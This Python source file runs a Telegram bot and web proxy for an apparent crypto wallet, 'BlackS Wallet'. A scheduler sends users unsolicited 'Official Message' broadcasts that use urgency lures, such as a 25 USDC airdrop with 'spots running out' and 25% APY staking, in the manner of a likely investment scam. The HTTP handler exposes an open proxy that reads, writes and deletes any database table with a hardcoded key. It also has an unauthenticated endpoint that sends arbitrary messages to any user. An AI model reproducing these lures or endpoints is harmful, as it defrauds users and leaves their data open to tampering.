"""
BlackS Wallet — Telegram Bot + Supabase Proxy
"""

import os
import json
import logging
import asyncio
import threading
import datetime
import time
import urllib.parse
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler

BOT_TOKEN  = os.getenv("BOT_TOKEN", "")
WEBAPP_URL = os.getenv("WEBAPP_URL", "")
PORT       = int(os.getenv("PORT", 10000))

SB_URL = "https://rvduytgfwtyytodyxmfo.supabase.co"
SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ2ZHV5dGdmd3R5eXRvZHl4bWZvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM4MzMwNjEsImV4cCI6MjA4OTQwOTA2MX0.OHS7vQwJlicKmTiONLzjG7-N18tz_-_rZmSADuocLfA"

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

_app  = None
_loop = None

# ══════════════════════════════════════════════════════════
# BROADCAST CONFIG
# ══════════════════════════════════════════════════════════
BROADCAST_LIMIT_PER_DAY  = 5     # max sends per run
BROADCAST_DELAY_SECONDS  = 90    # seconds between each send
BROADCAST_COOLDOWN_HOURS = 48    # min hours before same TG user gets another message
BROADCAST_STATE_FILE     = "/tmp/broadcast_state.json"

BROADCAST_MESSAGES = [
    # ── Airdrop (5) ──
    "🪂 <b>BlackS Airdrop is live</b>\n\n25 USDC on Solana is waiting for you. Early users only — spots are running out. Open your wallet to claim.",
    "⏳ <b>Airdrop closes soon</b>\n\nOnly a limited number of spots left for the BlackS 25 USDC airdrop on Solana. Don't miss it — open your wallet now.",
    "🎁 <b>You have an unclaimed reward</b>\n\n25 USDC has been reserved for your BlackS Wallet on Solana network. Connect your wallet to receive it.",
    "📢 <b>BlackS Airdrop reminder</b>\n\n25 USDC · Solana network · Limited spots. Thousands of users have already claimed. Your turn — open BlackS Wallet.",
    "💸 <b>25 USDC is waiting for you</b>\n\nBlackS Wallet airdrop campaign is still active. Claim your reward on Solana before the campaign ends.",
    # ── Staking 25% APY (5) ──
    "📈 <b>Earn 25% APY on SOL</b>\n\nYour Solana is sitting idle. Stake it in BlackS Wallet and start earning every epoch — no lock-up required.",
    "⚡ <b>BlackS Staking is live</b>\n\nSOL · 25% APY. One of the highest yields available. Open BlackS Wallet and put your crypto to work.",
    "💰 <b>Your SOL could be earning right now</b>\n\nBlackS Validator offers 25% APY on Solana staking. Stake any amount — rewards accumulate every 2 days.",
    "🏆 <b>25% APY — top staking rate</b>\n\nBlackS Wallet users are already earning on SOL, ETH, ATOM and more. Open your wallet and start today.",
    "🔥 <b>Staking rewards are compounding</b>\n\nEvery epoch your SOL earns at 25% APY in BlackS Wallet. The sooner you start, the more you earn.",
]

import random

def get_next_broadcast_msg(state):
    """Pick a random message, avoid repeating until all are used."""
    used = state.get("used_indices", [])
    all_indices = list(range(len(BROADCAST_MESSAGES)))
    available = [i for i in all_indices if i not in used]
    if not available:
        # All used — reset
        available = all_indices
        state["used_indices"] = []
    idx = random.choice(available)
    state.setdefault("used_indices", []).append(idx)
    return BROADCAST_MESSAGES[idx]

# ══════════════════════════════════════════════════════════
# BROADCAST STATE — keyed by tg_id, not by email
# Structure:
# {
#   "msg_index": 3,
#   "last_sent": { "123456789": 1746000000.0, ... }  ← unix timestamp per tg_id
# }
# ══════════════════════════════════════════════════════════
def _load_state():
    try:
        with open(BROADCAST_STATE_FILE, 'r') as f:
            s = json.load(f)
            if "last_sent" not in s:
                s["last_sent"] = {}
            if "msg_index" not in s:
                s["msg_index"] = 0
            return s
    except:
        return {"msg_index": 0, "last_sent": {}}

def _save_state(state):
    try:
        with open(BROADCAST_STATE_FILE, 'w') as f:
            json.dump(state, f)
    except Exception as e:
        logger.error(f"state save error: {e}")

def _get_unique_tg_ids():
    """
    Fetch all tg_ids from accounts table.
    Deduplicates — one tg_id per real person regardless of how many wallets they have.
    """
    try:
        url = f"{SB_URL}/rest/v1/accounts?select=tg_id&tg_id=not.is.null"
        req = urllib.request.Request(url, headers={
            'apikey': SB_KEY,
            'Authorization': 'Bearer ' + SB_KEY,
        })
        with urllib.request.urlopen(req, timeout=10) as r:
            rows = json.loads(r.read())
        # Deduplicate by tg_id — set removes duplicates
        unique = list({str(row['tg_id']) for row in rows if row.get('tg_id')})
        logger.info(f"Found {len(rows)} accounts → {len(unique)} unique TG users")
        return unique
    except Exception as e:
        logger.error(f"get_unique_tg_ids error: {e}")
        return []

async def run_daily_broadcast():
    if not _app:
        return

    state    = _load_state()
    now_ts   = time.time()
    cooldown = BROADCAST_COOLDOWN_HOURS * 3600

    all_ids = _get_unique_tg_ids()
    if not all_ids:
        logger.info("Broadcast: no users found")
        return

    # Filter: only users whose last_sent is older than 48h (or never sent)
    eligible = []
    for tg_id in all_ids:
        last = state["last_sent"].get(tg_id, 0)
        hours_ago = (now_ts - last) / 3600
        if hours_ago >= BROADCAST_COOLDOWN_HOURS:
            eligible.append(tg_id)
        else:
            logger.info(f"Broadcast: skip {tg_id} — sent {hours_ago:.1f}h ago (cooldown {BROADCAST_COOLDOWN_HOURS}h)")

    if not eligible:
        logger.info("Broadcast: all users within 48h cooldown, nothing to send")
        return

    to_send  = eligible[:BROADCAST_LIMIT_PER_DAY]
    msg_text = "💼 <b>BlackS Wallet — Official Message</b>\n\n" + get_next_broadcast_msg(state) + "\n\n─────────────────\n🔒 BlackS Wallet · Secure Crypto Platform"

    kb     = [[InlineKeyboardButton("Open Wallet 🚀", web_app=WebAppInfo(url=WEBAPP_URL))]]
    markup = InlineKeyboardMarkup(kb)

    sent = 0
    for tg_id in to_send:
        try:
            await _app.bot.send_message(
                chat_id=int(tg_id),
                text=msg_text,
                parse_mode="HTML",
                reply_markup=markup
            )
            state["last_sent"][tg_id] = time.time()
            sent += 1
            logger.info(f"Broadcast: ✅ sent to {tg_id} ({sent}/{len(to_send)})")
        except Exception as e:
            logger.warning(f"Broadcast: ❌ failed {tg_id}: {e}")

        if sent < len(to_send):
            await asyncio.sleep(BROADCAST_DELAY_SECONDS)

    # Message index is managed by get_next_broadcast_msg

    # Cleanup old entries (older than 7 days) to keep state file small
    week_ago = now_ts - 7 * 86400
    state["last_sent"] = {k: v for k, v in state["last_sent"].items() if v > week_ago}

    _save_state(state)
    logger.info(f"Broadcast done: {sent} sent | next msg index: {state['msg_index']}")

    # Send report to admin
    if _app and sent >= 0:
        lines = [f"📊 <b>Broadcast Report</b>", f"", f"✅ Sent: {sent}", f"⏭ Skipped: {len(to_send) - sent}", f"👥 Eligible: {len(eligible)}", f"🔒 On cooldown: {len(all_ids) - len(eligible)}", f"", f"📝 Message used:", f"<i>{msg_text[:80]}...</i>"]
        if sent > 0:
            lines.append(f"")
            lines.append(f"📬 Sent to:")
            for tg_id in to_send[:sent]:
                lines.append(f"  • <code>{tg_id}</code>")
        report = "\n".join(lines)
        try:
            await _app.bot.send_message(chat_id=ADMIN_TG_ID, text=report, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Report send error: {e}")

async def broadcast_scheduler():
    """Fires once per day at 10:00 UTC."""
    while True:
        now    = datetime.datetime.utcnow()
        target = now.replace(hour=10, minute=0, second=0, microsecond=0)
        if now >= target:
            target += datetime.timedelta(days=1)
        wait = (target - now).total_seconds()
        logger.info(f"Broadcast: next run in {wait/3600:.1f}h at {target.strftime('%Y-%m-%d %H:%M')} UTC")
        await asyncio.sleep(wait)
        await run_daily_broadcast()


# ══════════════════════════════════════════════════════════
# HTTP HANDLER
# ══════════════════════════════════════════════════════════
class Handler(BaseHTTPRequestHandler):

    def do_OPTIONS(self):
        self._cors(200)

    def do_GET(self):
        p = self.path
        if p.startswith('/proxy'):
            self._sb_proxy_get()
        elif p.startswith('/get_chat'):
            self._get_chat()
        elif p.startswith('/get_ip'):
            self._get_ip()
        else:
            self.send_response(200)
            self._cors_headers()
            self.end_headers()
            self.wfile.write(b'BlackS Wallet Bot OK')

    def _get_ip(self):
        ip = self.headers.get("X-Forwarded-For", self.client_address[0])
        if ip and "," in ip:
            ip = ip.split(",")[0].strip()
        try:
            req = urllib.request.Request(
                f"http://ip-api.com/json/{ip}?fields=query,country,city",
                headers={"User-Agent": "Mozilla/5.0"}
            )
            with urllib.request.urlopen(req, timeout=3) as resp:
                geo = json.loads(resp.read())
            result = {"ip": geo.get("query", ip), "country": geo.get("country"), "city": geo.get("city")}
        except:
            result = {"ip": ip, "country": None, "city": None}
        body = json.dumps(result).encode()
        self.send_response(200)
        self._cors_headers()
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        p = self.path
        if p.startswith('/proxy'):
            self._sb_proxy_post()
        elif p == '/send_otp':
            self._send_to_user('otp')
        elif p == '/send_message':
            self._send_to_user('message')
        else:
            self.send_response(404)
            self.end_headers()

    def do_PATCH(self):
        if self.path.startswith('/proxy'):
            self._sb_proxy_patch()
        else:
            self.send_response(404)
            self.end_headers()

    def do_DELETE(self):
        if self.path.startswith('/proxy'):
            self._sb_proxy_delete()
        else:
            self.send_response(404)
            self.end_headers()

    def _sb_path(self):
        parsed = urllib.parse.urlparse(self.path)
        table  = parsed.path.replace('/proxy/', '').split('/')[0]
        query  = parsed.query
        return table, query

    def _sb_headers(self, extra=None):
        h = {
            'apikey':        SB_KEY,
            'Authorization': 'Bearer ' + SB_KEY,
            'Content-Type':  'application/json',
            'Prefer':        'return=representation',
        }
        if extra:
            h.update(extra)
        return h

    def _sb_proxy_get(self):
        table, query = self._sb_path()
        url = f"{SB_URL}/rest/v1/{table}?{query}"
        try:
            req = urllib.request.Request(url, headers=self._sb_headers())
            with urllib.request.urlopen(req, timeout=10) as r:
                body = r.read()
            self._raw(200, body)
        except urllib.error.HTTPError as e:
            self._raw(e.code, e.read())
        except Exception as e:
            self._json(500, {'error': str(e)})

    def _sb_proxy_post(self):
        table, query = self._sb_path()
        url = f"{SB_URL}/rest/v1/{table}"
        if query:
            url += '?' + query
        body = self._read_body()
        try:
            req = urllib.request.Request(url, data=body, headers=self._sb_headers(
                {'Prefer': 'resolution=merge-duplicates,return=representation'}
            ), method='POST')
            with urllib.request.urlopen(req, timeout=10) as r:
                resp = r.read()
            self._raw(200, resp)
        except urllib.error.HTTPError as e:
            self._raw(e.code, e.read())
        except Exception as e:
            self._json(500, {'error': str(e)})

    def _sb_proxy_patch(self):
        table, query = self._sb_path()
        url = f"{SB_URL}/rest/v1/{table}?{query}"
        body = self._read_body()
        try:
            req = urllib.request.Request(url, data=body, headers=self._sb_headers(), method='PATCH')
            with urllib.request.urlopen(req, timeout=10) as r:
                resp = r.read()
            self._raw(200, resp)
        except urllib.error.HTTPError as e:
            self._raw(e.code, e.read())
        except Exception as e:
            self._json(500, {'error': str(e)})

    def _sb_proxy_delete(self):
        table, query = self._sb_path()
        url = f"{SB_URL}/rest/v1/{table}?{query}"
        try:
            req = urllib.request.Request(url, headers=self._sb_headers(), method='DELETE')
            with urllib.request.urlopen(req, timeout=10) as r:
                resp = r.read()
            self._raw(200, resp)
        except urllib.error.HTTPError as e:
            self._raw(e.code, e.read())
        except Exception as e:
            self._json(500, {'error': str(e)})

    def _get_chat(self):
        try:
            qs     = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(qs)
            tg_id  = params.get('tg_id', [None])[0]
            if not tg_id:
                self._json(400, {'ok': False, 'error': 'tg_id required'})
                return
            url = f'https://api.telegram.org/bot{BOT_TOKEN}/getChat?chat_id={tg_id}'
            with urllib.request.urlopen(url, timeout=8) as r:
                data = r.read()
            self._raw(200, data)
        except Exception as e:
            self._json(500, {'ok': False, 'error': str(e)})

    def _send_to_user(self, mode):
        try:
            data  = json.loads(self._read_body())
            tg_id = data.get('tg_id')
            if not tg_id:
                self._json(400, {'ok': False, 'error': 'tg_id required'})
                return
            if mode == 'otp':
                code = data.get('code')
                if not code:
                    self._json(400, {'ok': False, 'error': 'code required'})
                    return
                text = (
                    f"🔐 <b>BlackS Wallet — Verification Code</b>\n\n"
                    f"Your code: <code>{code}</code>\n\n"
                    f"Valid for <b>10 minutes</b>.\n"
                    f"Never share this code with anyone."
                )
            else:
                text = data.get('text', '').strip()
                if not text:
                    self._json(400, {'ok': False, 'error': 'text required'})
                    return
            if _app and _loop:
                future = asyncio.run_coroutine_threadsafe(
                    _app.bot.send_message(chat_id=int(tg_id), text=text, parse_mode='HTML'),
                    _loop
                )
                future.result(timeout=10)
                self._json(200, {'ok': True})
            else:
                self._json(503, {'ok': False, 'error': 'Bot not ready'})
        except Exception as e:
            self._json(500, {'ok': False, 'error': str(e)})

    def _read_body(self):
        n = int(self.headers.get('Content-Length', 0))
        return self.rfile.read(n)

    def _cors_headers(self):
        self.send_header('Access-Control-Allow-Origin',  '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, PATCH, DELETE, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, apikey, Authorization, Prefer')

    def _cors(self, status):
        self.send_response(status)
        self._cors_headers()
        self.end_headers()

    def _raw(self, status, body):
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(body))
        self._cors_headers()
        self.end_headers()
        self.wfile.write(body)

    def _json(self, status, data):
        body = json.dumps(data).encode()
        self._raw(status, body)

    def log_message(self, *args): pass


# ══════════════════════════════════════════════════════════
# BOT HANDLERS
# ══════════════════════════════════════════════════════════
def _main_keyboard():
    """Persistent reply keyboard shown under the chat."""
    return ReplyKeyboardMarkup([
        [KeyboardButton("📊 My Balance"), KeyboardButton("ℹ️ Help")],
        [KeyboardButton("🔗 Referral Link"), KeyboardButton("📰 News")],
        [KeyboardButton("💬 Support")],
    ], resize_keyboard=True, input_field_placeholder="Choose an option...")

def _sb_get_sync(path):
    """Sync Supabase GET for bot handlers."""
    try:
        url = f"{SB_URL}/rest/v1/{path}"
        req = urllib.request.Request(url, headers={
            'apikey': SB_KEY,
            'Authorization': 'Bearer ' + SB_KEY,
        })
        with urllib.request.urlopen(req, timeout=8) as r:
            return json.loads(r.read())
    except:
        return []

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    tg_id   = str(update.effective_user.id)
    name    = update.effective_user.first_name or "there"
    kb      = [[InlineKeyboardButton("🚀 Open BlackS Wallet", web_app=WebAppInfo(url=WEBAPP_URL))]]
    ref_code = context.args[0].upper() if context.args else None
    logger.info(f"Start called: tg_id={tg_id}, ref_code={ref_code}, args={context.args}")

    # Log start event to Supabase
    try:
        import urllib.request as ur
        tg_user = update.effective_user
        event_data = json.dumps({
            "tg_id": tg_id,
            "first_name": tg_user.first_name or "",
            "username": tg_user.username or "",
            "ref_code": ref_code or "",
            "created_at": __import__('datetime').datetime.utcnow().isoformat()
        }).encode()
        # Only insert if tg_id not already in table
        check_req = ur.Request(
            f"{SB_URL}/rest/v1/bot_starts?tg_id=eq.{tg_id}&select=tg_id&limit=1",
            headers={'apikey': SB_KEY, 'Authorization': 'Bearer ' + SB_KEY}
        )
        check_resp = json.loads(ur.urlopen(check_req, timeout=5).read())
        if not check_resp:
            req = ur.Request(
                f"{SB_URL}/rest/v1/bot_starts",
                data=event_data,
                headers={
                    'apikey': SB_KEY,
                    'Authorization': 'Bearer ' + SB_KEY,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=minimal'
                },
                method='POST'
            )
            ur.urlopen(req, timeout=5)
        logger.info(f"bot_starts logged: tg_id={tg_id}")
    except Exception as e:
        logger.warning(f"bot_starts log error: {e}")

    # Check if new user (no account in DB)
    rows   = _sb_get_sync(f"accounts?tg_id=eq.{tg_id}&select=email")
    is_new = len(rows) == 0
    logger.info(f"User check: is_new={is_new}, rows={rows}")

    # If referral code passed — store it for later activation
    if ref_code:
        # Check code exists
        promo = _sb_get_sync(f"promo_codes?code=eq.{urllib.parse.quote(ref_code)}&select=code,owner_email")
        logger.info(f"Promo check: code={ref_code}, found={bool(promo)}")
        if promo:
            try:
                import urllib.request as ur
                data = json.dumps({
                    "tg_id": tg_id,
                    "ref_code": ref_code,
                    "used": False,
                    "created_at": __import__('datetime').datetime.utcnow().isoformat()
                }).encode()
                req = ur.Request(
                    f"{SB_URL}/rest/v1/pending_referrals",
                    data=data,
                    headers={
                        'apikey': SB_KEY,
                        'Authorization': 'Bearer ' + SB_KEY,
                        'Content-Type': 'application/json',
                        'Prefer': 'return=representation'
                    },
                    method='POST'
                )
                resp = ur.urlopen(req, timeout=5)
                logger.info(f"pending_referrals saved: status={resp.status}, tg_id={tg_id}, code={ref_code}")
            except Exception as e:
                logger.error(f"pending_referrals save ERROR: {e}")
            await update.message.reply_text(
                f"🎁 <b>Referral code <code>{ref_code}</code> applied!</b>\n\n"
                f"Create your wallet and the code will be activated automatically.\n\n"
                f"You'll both receive a $0.50 bonus! 🎉",
                parse_mode="HTML"
            )

    if is_new:
        text = (
            f"👋 Welcome to <b>BlackS Wallet</b>, {name}!\n\n"
            f"Your secure crypto wallet inside Telegram.\n\n"
            f"<b>Here's what you can do:</b>\n"
            f"💰 Hold & manage crypto assets\n"
            f"📈 Stake SOL at <b>25% APY</b> and earn daily\n"
            f"🔄 Swap tokens instantly with flat $2 fee\n"
            f"🪂 Claim your <b>25 USDC airdrop</b> on Solana\n"
            f"🤝 Invite friends and earn referral rewards\n\n"
            f"<b>Get started in 3 steps:</b>\n"
            f"1️⃣ Open the wallet below\n"
            f"2️⃣ Create your account with email\n"
            f"3️⃣ Deposit crypto or claim your airdrop\n\n"
            f"─────────────────\n"
            f"🔒 BlackS Wallet · Secure Crypto Platform"
        )
    else:
        text = (
            f"👋 Welcome back, <b>{name}</b>!\n\n"
            f"Open your wallet to check your balance, staking rewards and portfolio.\n\n"
            f"─────────────────\n"
            f"🔒 BlackS Wallet · Secure Crypto Platform"
        )

    # Show both inline open button AND persistent reply keyboard
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=_main_keyboard())
    await update.message.reply_text("👇 Use the buttons below:", reply_markup=InlineKeyboardMarkup(kb))

async def wallet(update, context): await start(update, context)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    kb = [[InlineKeyboardButton("🚀 Open Wallet", web_app=WebAppInfo(url=WEBAPP_URL))]]
    text = (
        "💼 <b>BlackS Wallet — Help Center</b>\n\n"
        "<b>Commands:</b>\n"
        "▸ /start — Open your wallet\n"
        "▸ /status — Check your balance & staking\n"
        "▸ /help — Show this message\n"
        "▸ /support — Contact support team\n\n"
        "<b>Features:</b>\n"
        "📈 Staking — SOL 25% APY, ETH 3.2%, ATOM 14.2%\n"
        "🔄 Swap — Instant token exchange, flat $2 fee\n"
        "🪂 Airdrop — 25 USDC on Solana for early users\n"
        "🤝 Referral — Earn $0.50 per invited friend\n"
        "💼 Portfolio — Track all your assets in one place\n\n"
        "<b>Account Status:</b>\n"
        "🥉 Bronze — $0–$999 · Standard APY\n"
        "🥈 Silver — $1k–$10k · +2% APY bonus\n"
        "🥇 Gold — $10k+ · +5% APY · $1 swap fee\n\n"
        "<b>Support:</b> @BlackSWalletHelp\n\n"
        "─────────────────\n"
        "🔒 BlackS Wallet · Secure Crypto Platform"
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    await update.message.reply_text(
        "💬 <b>Support</b>\n\nContact us: @BlackSWalletHelp\n\nInclude your email and issue description.",
        parse_mode="HTML"
    )

# Your Telegram ID — only you can trigger manual broadcast
ADMIN_TG_ID = 8708087218

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    user_id = update.effective_user.id
    if ADMIN_TG_ID == 0 or user_id != ADMIN_TG_ID:
        await update.message.reply_text("⛔ Not authorized.")
        return
    await update.message.reply_text("🚀 Starting broadcast...")
    await run_daily_broadcast()
    await update.message.reply_text("✅ Broadcast done. Check logs for details.")

async def reflink_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    tg_id = str(update.effective_user.id)

    rows = _sb_get_sync(f"accounts?tg_id=eq.{tg_id}&select=email")
    if not rows:
        await update.message.reply_text("❌ No wallet found. Use /start first.")
        return

    email = rows[0]['email']
    enc   = urllib.parse.quote(email)
    promo = _sb_get_sync(f"promo_codes?owner_email=eq.{enc}&select=code,used_count")

    if not promo:
        await update.message.reply_text(
            "❌ <b>No referral code yet</b>\n\n"
            "To get your referral link:\n"
            "1️⃣ Open your wallet below\n"
            "2️⃣ Go to <b>Referral</b> tab (More menu)\n"
            "3️⃣ Tap <b>Generate My Promo Code</b>\n"
            "4️⃣ Come back and type /reflink\n\n"
            "💰 You'll earn $0.50 for every friend who joins!",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚀 Open Wallet", web_app=WebAppInfo(url=WEBAPP_URL))]])
        )
        return

    code      = promo[0]['code']
    act_rows  = _sb_get_sync(f"activations?code=eq.{urllib.parse.quote(code)}&select=user_email")
    used      = len(act_rows)
    bot_name = "blackscrypto_bot"
    link     = f"https://t.me/{bot_name}?start={code}"

    await update.message.reply_text(
        f"🔗 <b>Your Referral Link</b>\n\n"
        f"<code>{link}</code>\n\n"
        f"👥 Used by: <b>{used}</b> people\n"
        f"💰 Reward: <b>$0.50</b> per referral\n\n"
        f"Share this link — when someone opens it and creates a wallet, "
        f"you both get $0.50 bonus automatically!",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={urllib.parse.quote(link)}&text={urllib.parse.quote('Join BlackS Wallet — earn crypto rewards! Use my referral link:')}")]
        ])
    )

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    tg_id = str(update.effective_user.id)
    kb    = [[InlineKeyboardButton("🚀 Open Wallet", web_app=WebAppInfo(url=WEBAPP_URL))]]

    # Find account by tg_id
    rows = _sb_get_sync(f"accounts?tg_id=eq.{tg_id}&select=email")
    if not rows:
        await update.message.reply_text(
            "❌ No wallet found for your Telegram account.\n\nUse /start to create one.",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb)
        )
        return

    email = rows[0]['email']
    enc   = urllib.parse.quote(email)

    # Fetch balance and staking
    bal_rows   = _sb_get_sync(f"real_balances?email=eq.{enc}&select=balance,coins")
    stake_rows = _sb_get_sync(f"user_staking?email=eq.{enc}&select=ticker,amount")
    ref_rows   = _sb_get_sync(f"ref_balances?email=eq.{enc}&select=balance")

    # Calculate total USD
    PRICES = {
        'BTC':57943,'ETH':1980,'SOL':128.5,'BNB':590,'USDT':1,'USDC':1,
        'TRX':0.12,'TON':0.8,'ADA':0.68,'MATIC':0.22,'XRP':2.14,
        'AVAX':21.4,'DOT':4.2,'LINK':13.8,'ATOM':4.5,'INJ':12.6,
        'NEAR':2.65,'ARB':0.38,'LTC':86,'DOGE':0.172,
    }
    total_usd = 0
    coins_lines = []

    if bal_rows:
        row   = bal_rows[0]
        coins = row.get('coins') or {}
        # coins may come as dict or JSON string
        if isinstance(coins, str):
            try: coins = json.loads(coins)
            except: coins = {}
        if coins:
            for ticker, amt in coins.items():
                try:
                    usd = float(amt) * PRICES.get(ticker.upper(), 1)
                    total_usd += usd
                    if float(amt) > 0.000001:
                        coins_lines.append(f"  • {ticker}: {float(amt):.4f} ≈ ${usd:,.2f}")
                except: pass
        else:
            # Fallback to legacy balance field (USD as USDT)
            legacy = float(row.get('balance') or 0)
            if legacy > 0:
                total_usd = legacy
                coins_lines.append(f"  • USDT: {legacy:.2f}")

    staking_usd = 0
    staking_lines = []
    STAKE_APY = {'SOL':25,'ETH':3.2,'MATIC':4.8,'ADA':2.4,'XTZ':5.6,'ATOM':14.2,'INJ':11.8}
    for s in stake_rows:
        amt = float(s['amount'])
        usd = amt * PRICES.get(s['ticker'], 0)
        staking_usd += usd
        staking_lines.append(f"  • {s['ticker']}: {amt:.4f} @ {STAKE_APY.get(s['ticker'],5)}% APY")

    ref_bal = float(ref_rows[0]['balance']) if ref_rows else 0

    # Status level
    if total_usd >= 10000:   status = "🥇 Gold"
    elif total_usd >= 1000:  status = "🥈 Silver"
    else:                    status = "🥉 Bronze"

    lines = [
        "💼 <b>BlackS Wallet — Account Status</b>\n",
        f"<b>Portfolio Balance:</b> ${total_usd:,.2f}",
    ]
    if coins_lines:
        lines.append("\n".join(coins_lines))

    lines.append(f"\n<b>Staking:</b> ${staking_usd:,.2f}")
    if staking_lines:
        lines.append("\n".join(staking_lines))
    else:
        lines.append("  No active staking")

    lines.append(f"\n<b>Account Level:</b> {status}")
    lines.append(f"<b>Referral Balance:</b> ${ref_bal:.2f}")
    lines.append("\n─────────────────\n🔒 BlackS Wallet · Secure Crypto Platform")

    await update.message.reply_text(
        "\n".join(lines), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb)
    )

async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    text = update.message.text or ""

    if "Referral Link" in text:
        await reflink_cmd(update, context)
        return
    if "News" in text or "Новости" in text:
        await update.message.reply_text(
            "📰 <b>BlackS Wallet News</b>\n\nFollow our official channel for updates, announcements and crypto news:\n\n👉 @blacksectorcrypto\nhttps://t.me/blacksectorcrypto",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📢 Open Channel", url="https://t.me/blacksectorcrypto")]])
        )
        return
    if "Balance" in text or "Баланс" in text:
        await status_cmd(update, context)
        return
    if "Help" in text or "Инфо" in text or "Помощь" in text:
        await help_cmd(update, context)
        return
    if "Support" in text or "Поддержка" in text:
        await support(update, context)
        return

    kb = [[InlineKeyboardButton("Open Wallet 🚀", web_app=WebAppInfo(url=WEBAPP_URL))]]
    await update.message.reply_text(
        "Use the buttons below or type /help",
        reply_markup=_main_keyboard()
    )


# ══════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════
def main():
    global _app, _loop

    if not BOT_TOKEN: logger.error("BOT_TOKEN not set!"); return
    if not WEBAPP_URL: logger.error("WEBAPP_URL not set!"); return

    threading.Thread(
        target=lambda: HTTPServer(('0.0.0.0', PORT), Handler).serve_forever(),
        daemon=True
    ).start()
    logger.info(f"HTTP server on port {PORT}")

    _app = Application.builder().token(BOT_TOKEN).build()
    _app.add_handler(CommandHandler("start",   start))
    _app.add_handler(CommandHandler("wallet",  wallet))
    _app.add_handler(CommandHandler("help",    help_cmd))
    _app.add_handler(CommandHandler("support", support))
    _app.add_handler(CommandHandler("status",    status_cmd))
    _app.add_handler(CommandHandler("reflink",   reflink_cmd))
    _app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    _app.add_handler(MessageHandler(filters.COMMAND, unknown))
    _app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))

    _loop = asyncio.get_event_loop()
    _loop.create_task(broadcast_scheduler())

    # Register bot commands menu
    async def setup_commands():
        from telegram import BotCommand, MenuButtonCommands
        await _app.bot.set_my_commands([
            BotCommand("start",     "🚀 Open BlackS Wallet"),
            BotCommand("status",    "📊 My balance & staking"),
            BotCommand("reflink",   "🔗 My referral link"),
            BotCommand("help",      "ℹ️ Help & features"),
            BotCommand("support",   "💬 Contact support"),
        ])
        from telegram import MenuButtonWebApp, WebAppInfo as WAI
        await _app.bot.set_chat_menu_button(
            menu_button=MenuButtonWebApp(text="🚀 Open Wallet", web_app=WAI(url=WEBAPP_URL))
        )
        logger.info("Bot commands menu registered")

    _loop.run_until_complete(setup_commands())

    logger.info(f"Bot started | limit={BROADCAST_LIMIT_PER_DAY}/day | delay={BROADCAST_DELAY_SECONDS}s | cooldown={BROADCAST_COOLDOWN_HOURS}h")
    _app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
